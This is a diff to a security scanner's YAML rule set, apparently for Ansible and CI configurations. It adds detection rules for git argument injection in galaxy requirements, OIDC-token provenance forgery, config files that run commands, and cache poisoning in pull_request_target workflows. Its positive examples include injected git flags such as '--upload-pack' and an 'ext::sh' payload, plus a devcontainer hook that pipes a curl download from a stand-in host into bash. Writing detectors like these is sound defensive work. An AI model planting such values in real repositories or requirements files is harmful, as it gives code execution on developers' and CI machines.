@@ -806,6 +806,7 @@ patterns:
     multiline: true
     window: 10
     recommendation: "Prefer `pull_request` (runs in the fork's context with a read-only token). If you genuinely need base-repo secrets, require an `if: github.event.pull_request.head.repo.full_name == github.repository` guard so the job only runs for non-fork branches, and NEVER check out `${{ github.event.pull_request.head.sha }}` before that guard. Read: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+    cve: ["CVE-2026-45321"]
     cis_controls: ["CIS-Supply-Chain"]
     nist_controls: ['AC-3', 'AC-6', 'CM-11', 'SA-10', 'SI-7']
     pci_dss: ['6.3.2', '7.2.1', '7.2.2']
@@ -1082,6 +1083,7 @@ patterns:
             ansible.builtin.get_url:
               url: https://example.com/api/config
               dest: /etc/app.json
+    cve: ["CVE-2026-45321"]
     cis_controls: ["CIS-Supply-Chain"]
     nist_controls: ["CM-11", "SA-10", "SA-11", "SI-7"]
     pci_dss: ["6.3.2", "6.3.3"]
@@ -2786,3 +2788,150 @@ patterns:
     pci_dss: ['3.6.1', '8.3.1', '10.3.1']
     hipaa: ['164.312(a)(2)(i)', '164.312(b)']
     soc2: ['CC6.1', 'CC7.2']
+
+  - id: "galaxy_requirements_src_argument_injection"
+    category: "supply_chain"
+    severity: "HIGH"
+    title: "Galaxy Requirement src: Injects git Argument Flags (CVE-2026-11332)"
+    description: "A galaxy requirement (`requirements.yml` role/collection entry, or a role's `meta/requirements.yml`) has a `src:` value that begins with a `-` or embeds a git command-line flag (`--upload-pack`, `--config`/`-c`, `ext::`, `--template`, `--separate-git-dir`). `ansible-galaxy role install` passes `src:` into a `git` invocation without neutralising argument delimiters (CVE-2026-11332, CVSS 7.8, disclosed Jun 2026), so a malicious role author can smuggle git flags through the field and reach arbitrary code execution on the machine that installs the role. `--upload-pack=<cmd>` and `ext::sh -c <cmd>` are the direct RCE primitives; `-c core.fsmonitor=<cmd>` and `-c protocol.ext.allow=always` are the enablers. Any `src:` whose first non-quote character is `-`, or that contains `ext::`, is either an injection attempt or a typo that will break the install."
+    regex: "(?m)^[ \\t]*(?:-\\s+)?src\\s*:\\s*['\"]?(?:-{1,2}[A-Za-z]|ext::|[^'\"\\n]*?\\s--?(?:upload-pack|config|template|separate-git-dir|c)\\b)"
+    positive_examples:
+      - "    src: '--upload-pack=touch /tmp/pwned'"
+      - "    src: ext::sh -c touch% /tmp/pwned"
+      - "  - src: -c protocol.ext.allow=always"
+    negative_examples:
+      - "    src: https://github.com/myorg/ansible-role-nginx"
+      - "    src: git+https://git.example.com/ansible/collection-foo"
+      - "  - src: geerlingguy.nginx"
+    recommendation: "Upgrade ansible-core to >= 2.21.1 (the fix passes role requirement fields as positional git arguments after a `--` delimiter). Never install roles or collections from untrusted sources. In `requirements.yml`, a `src:` must be a plain Galaxy name (`namespace.name`), an `https://` URL, or a `git+https://` / `git@` URL - it must never begin with `-` or contain `ext::`. Pin every git source to an immutable commit SHA via `version:`. Gate `ansible-galaxy install -r` in CI behind a schema check that rejects any `src:` starting with a dash."
+    cve: ["CVE-2026-11332"]
+    cwe: ['CWE-88', 'CWE-77']
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: [V15.2.4, V5.2.5]
+    mitre_attack: ['T1195.002', 'T1059']
+    cis_controls: ['CIS-Supply-Chain', 'CIS-16.11']
+    nist_controls: ['CM-11', 'SA-10', 'SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.3.2']
+    hipaa: ['164.312(a)(1)']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "ci_oidc_token_minted_then_piped_to_signing"
+    category: "supply_chain"
+    severity: "HIGH"
+    title: "CI OIDC Token Minted And Piped Into An Artifact Signing Step"
+    description: "A task reads a CI OIDC token from the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` / `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, `curl ...&audience=sigstore`, `gh actions-id-token`, `SLSA`/`cosign`-oriented `id-token` request) and feeds it into a signing / attestation step (`cosign sign`, `cosign attest`, `slsa-github-generator`, `syft attest`, `sigstore-python`). Minting the ambient workload-identity token and handing it to a signing tool in the same playbook is the provenance-forgery primitive documented in the 2026 Miasma / Shai-Hulud supply-chain worms: an attacker who lands code in the pipeline uses the runner's own OIDC identity to produce a valid SLSA attestation over a malicious artifact, so downstream verification passes. Legitimate signing should happen in a dedicated, minimal, reviewed job - not inline next to arbitrary build steps that could be tampered with."
+    regex: "(?:ACTIONS_ID_TOKEN_REQUEST_(?:URL|TOKEN)|actions-id-token|audience=sigstore|id-token\\s*:\\s*write)[\\s\\S]{0,600}?(?:cosign\\s+(?:sign|attest)|slsa-github-generator|syft\\s+attest|sigstore)"
+    positive_examples:
+      - |2-
+        shell: |
+            TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" | jq -r .value)
+            cosign sign --identity-token "$TOKEN" $IMAGE
+    negative_examples:
+      - |2-
+        - name: build the image
+          community.docker.docker_image:
+            name: myapp
+            source: build
+      - |2-
+        - name: verify a signature at deploy time
+          ansible.builtin.command: cosign verify --certificate-identity ci@example.com myapp:1.2.3
+    multiline: true
+    window: 16
+    recommendation: "Do signing in an isolated, least-privilege CI job whose only inputs are the immutable build artifact (by digest) and the OIDC identity - never inline with build/test steps that execute third-party code. Scope `id-token: write` to that job alone (GitHub Actions job-level `permissions:`), and pin every action in it to a full commit SHA. Verify the artifact digest against the build job's output before signing. Prefer the maintained `slsa-framework/slsa-github-generator` reusable workflow over a hand-rolled `curl | cosign` so the token never transits a shell you control. At consumption time, verify both the signature and the SLSA provenance predicate (builder ID + source repo), not just that a signature exists."
+    cve: ["CVE-2026-45321"]
+    cwe: ['CWE-345', 'CWE-347', 'CWE-16']
+    owasp_appsec: ["A08:2021"]
+    owasp_asvs: [V15.2.4, V10.3.2]
+    mitre_attack: ['T1195.002', 'T1606']
+    cis_controls: ['CIS-Supply-Chain', 'CIS-16.1']
+    nist_controls: ['CM-14', 'SA-10', 'SI-7', 'SR-11']
+    pci_dss: ['6.3.2']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "config_file_with_embedded_run_on_event_command"
+    category: "supply_chain"
+    severity: "HIGH"
+    title: "Playbook Writes A Config File That Executes A Command On Open / Install / Build"
+    description: "A task writes a developer-config file whose format runs a shell command as a side effect of a routine action: `.devcontainer/devcontainer.json` / `devcontainer.json` with `postCreateCommand` / `postStartCommand` / `onCreateCommand` / `initializeCommand`, a `package.json` with `preinstall` / `postinstall` / `prepare` scripts, a `binding.gyp` (runs during `npm install` via node-gyp), or a git `core.hooksPath` / `.git/hooks/` entry. These 'config files that run code' turn `code .`, `npm install`, or `git commit` into arbitrary execution on a developer or CI machine. Planting them from a playbook - especially with a templated command body - is a persistence and lateral-movement primitive: the command runs later, as the developer, with no further prompt."
+    regex: "(?:ansible\\.builtin\\.(?:copy|template|blockinfile|lineinfile)|copy|template|blockinfile|lineinfile)\\s*:[\\s\\S]{0,300}?(?:(?:dest|path)\\s*:\\s*['\"]?[^'\"\\n]*(?:devcontainer\\.json|binding\\.gyp|/\\.git/hooks/|core\\.hooksPath)|(?:content|line|block)\\s*:[\\s\\S]{0,200}?(?:postCreateCommand|postStartCommand|onCreateCommand|initializeCommand|\"(?:preinstall|postinstall|prepare)\"\\s*:))"
+    positive_examples:
+      - |2-
+        - name: drop a devcontainer
+          ansible.builtin.copy:
+            dest: "{{ repo }}/.devcontainer/devcontainer.json"
+            content: '{ "postCreateCommand": "curl http://x/i.sh | bash" }'
+      - |2-
+        - name: template package.json with an install hook
+          ansible.builtin.copy:
+            dest: /srv/app/package.json
+            content: '{ "scripts": { "postinstall": "node ./setup.js" } }'
+    negative_examples:
+      - |2-
+        - name: write a plain app config
+          ansible.builtin.copy:
+            dest: /etc/myapp/config.json
+            content: '{ "log_level": "info" }'
+      - |2-
+        - name: template an nginx conf
+          ansible.builtin.template:
+            src: nginx.conf.j2
+            dest: /etc/nginx/nginx.conf
+    multiline: true
+    window: 14
+    recommendation: "Keep developer-config files that can execute code (`devcontainer.json`, `package.json` lifecycle scripts, `binding.gyp`, git hooks) in the repository under code review, not pushed by automation. If automation must stage one, pin and checksum the exact content and never build the command from a template variable. For git, set `git config --global core.hooksPath` only to a reviewed, read-only, root-owned directory. In CI, run `npm ci --ignore-scripts` (or `--foreground-scripts` with a reviewed allowlist) so `preinstall`/`postinstall` cannot execute untrusted code. Audit any planted file for command-executing keys before trusting it."
+    cwe: ['CWE-94', 'CWE-506', 'CWE-829']
+    owasp_appsec: ["A03:2021", "A08:2021"]
+    owasp_asvs: [V15.2.4, V5.2.5]
+    mitre_attack: ['T1195.002', 'T1546', 'T1059']
+    cis_controls: ['CIS-Supply-Chain', 'CIS-16.11']
+    nist_controls: ['CM-7', 'SA-10', 'SI-3', 'SI-7']
+    pci_dss: ['6.2.4', '6.3.2']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "ci_cache_restored_in_privileged_pull_request_target_job"
+    category: "supply_chain"
+    severity: "HIGH"
+    title: "GitHub Actions Restores A Cache In A pull_request_target Workflow (Cache Poisoning, CVE-2026-45321)"
+    description: "A workflow that triggers on `pull_request_target` also uses `actions/cache` (or `actions/cache/restore`, or a `cache:` option on `setup-node`/`setup-python`/`setup-go`). `pull_request_target` runs with the base repository's write token, and the Actions cache is writable from an ordinary `pull_request` run on a fork branch - so an attacker restores a cache entry they poisoned from a fork into a trusted, privileged build. This is the cache-poisoning leg of the 2026 Mini Shai-Hulud chain (CVE-2026-45321): a poisoned dependency enters the trusted build, then the job's OIDC identity signs the result with valid provenance. A privileged trigger and a restored cache should never appear in the same workflow."
+    regex: "(?:on\\s*:\\s*(?:\\[[^\\]]*pull_request_target[^\\]]*\\]|[\\s\\S]{0,300}?\\n\\s*pull_request_target\\s*:))[\\s\\S]{0,4000}?(?:uses\\s*:\\s*actions/cache(?:/restore)?@|\\n\\s*cache\\s*:\\s*(?:['\"]?(?:npm|yarn|pnpm|pip|poetry|go|gradle|maven|sbt)|true))"
+    positive_examples:
+      - |2-
+        on:  # yamllint disable-line rule:truthy
+          pull_request_target:
+        jobs:
+          build:
+            steps:
+              - uses: actions/cache@v4
+                with:
+                  path: node_modules
+                  key: deps-${{ hashFiles('package-lock.json') }}
+    negative_examples:
+      - |2-
+        on:  # yamllint disable-line rule:truthy
+          pull_request:
+        jobs:
+          build:
+            steps:
+              - uses: actions/cache@v4
+                with:
+                  path: node_modules
+                  key: deps-${{ hashFiles('package-lock.json') }}
+      - |2-
+        on:  # yamllint disable-line rule:truthy
+          pull_request_target:
+        jobs:
+          label:
+            steps:
+              - uses: actions/labeler@v5
+    multiline: true
+    window: 60
+    recommendation: "Never restore a cache in a `pull_request_target` workflow. Split the work: run untrusted PR code (and any cache it touches) under `pull_request` with a read-only token, and do privileged steps in a separate `pull_request_target` job that checks out only the base ref and installs dependencies from a pinned lockfile with integrity checking (`npm ci`, `pip install --require-hashes`) rather than a restored cache. If you must cache in a trusted job, scope the cache key to the base ref only (never `hashFiles` of fork-controlled paths) and treat any restored artifact as untrusted input. Pin every action to a full commit SHA."
+    cve: ["CVE-2026-45321"]
+    cwe: ['CWE-349', 'CWE-829', 'CWE-345']
+    owasp_appsec: ["A08:2021", "A01:2021"]
+    owasp_asvs: [V15.2.4]
+    mitre_attack: ['T1195.002', 'T1199']
+    cis_controls: ['CIS-Supply-Chain', 'CIS-16.1']
+    nist_controls: ['CM-11', 'SA-10', 'SI-7', 'SR-11']
+    pci_dss: ['6.3.2', '7.2.1']
+    soc2: ['CC7.1', 'CC8.1']
